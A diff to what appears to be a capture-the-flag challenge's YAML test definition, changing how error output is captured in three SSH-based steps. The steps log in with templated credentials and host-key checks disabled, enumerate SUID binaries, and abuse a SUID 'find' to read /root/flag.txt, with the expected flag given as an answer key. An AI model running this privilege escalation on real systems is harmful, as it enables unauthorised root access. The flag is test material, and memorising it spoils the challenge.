@@ -86,17 +86,17 @@ topology:
 test:
   steps:
     - name: "SSH access as developer"
-      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'whoami' 2>/dev/null"
+      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'whoami' 2>&1"
       expect: "developer"
       timeout: 15
 
     - name: "Enumerate SUID binaries"
-      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | grep find' 2>/dev/null"
+      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | grep find' 2>&1"
       expect: "/usr/bin/find"
       timeout: 15
 
     - name: "Exploit SUID find for root shell and read flag"
-      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>&1"
       expect: "OCR{su1d_pr1v3sc_r00t3d}"
       timeout: 15
 
